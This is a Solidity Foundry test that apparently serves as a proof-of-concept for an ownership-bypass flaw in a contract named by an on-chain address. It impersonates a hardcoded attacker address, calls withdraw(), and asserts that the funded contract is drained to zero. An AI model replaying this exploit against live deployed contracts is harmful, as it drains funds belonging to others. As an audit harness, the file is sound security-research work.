// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x70f9eddb3931491aab1aeafbc1e7f1ca2a012db4.sol";

contract HomeyJarTest is Test {
    HomeyJar public jar;
    address constant ATTACKER = 0x2f61E7e1023Bc22063B8da897d8323965a7712B7;
    address constant DEPLOYER = address(0xDEAD);
    uint256 constant FUND_AMOUNT = 1 ether;

    function setUp() public {
        // Fund the deployer account
        vm.deal(DEPLOYER, FUND_AMOUNT);
        
        vm.startPrank(DEPLOYER);
        jar = new HomeyJar();
        // Transfer funds to the contract using call
        (bool success,) = address(jar).call{value: FUND_AMOUNT}("");
        require(success, "Funding failed");
        vm.stopPrank();
    }

    function test_AttackersOwnershipBypass() public {
        // Verify initial contract balance
        assertEq(address(jar).balance, FUND_AMOUNT, "Contract should have initial funding");

        console.log("--- BEFORE-Trigger Attack State ---");
        // Capture state before attack
        uint256 balanceBefore = address(jar).balance;
        address ownerBefore = jar.Owner();
        uint256 totalWithdrawalsBefore = jar.totalWithdrawals();
        
        console.log("Contract balance (before):", balanceBefore);
        console.log("Contract owner (before):", ownerBefore);
        console.log("Total withdrawals (before):", totalWithdrawalsBefore);

        console.log("--- Trigger Attack: Attacker calls withdraw ---");
        // Execute attack - attacker calls withdraw function
        vm.startPrank(ATTACKER);
        jar.withdraw();
        vm.stopPrank();

        console.log("--- AFTER-Trigger Attack State ---");
        // Capture state after attack
        uint256 balanceAfter = address(jar).balance;
        address ownerAfter = jar.Owner();
        uint256 totalWithdrawalsAfter = jar.totalWithdrawals();
        
        console.log("Contract balance (after):", balanceAfter);
        console.log("Contract owner (after):", ownerAfter);
        console.log("Total withdrawals (after):", totalWithdrawalsAfter);

        // Validate state changes
        bool ownerChanged = (ownerBefore != ownerAfter);
        bool balanceDrained = (balanceAfter == 0);
        uint256 expectedWithdrawnAmount = balanceBefore - balanceAfter;
        bool withdrawalsCorrect = (totalWithdrawalsAfter == totalWithdrawalsBefore + expectedWithdrawnAmount);
        
        console.log("State change summary:");
        console.log("Owner changed: %s", ownerChanged ? "YES" : "NO");
        console.log("Contract drained (balance=0): %s", balanceDrained ? "YES" : "NO");
        console.log("Withdrawals updated correctly: %s", withdrawalsCorrect ? "YES" : "NO");
        
        // Validate contract balance drained to 0
        assertEq(balanceAfter, 0, "Contract should be drained by attacker");

        // Final vulnerability verification - Attack succeeds if contract is drained
        if (balanceAfter == 0) {
            console.log("Vulnerability Exists: Attacker successfully drained contract");
        } else {
            console.log("Vulnerability not Exist: Contract balance not drained");
        }
    }
}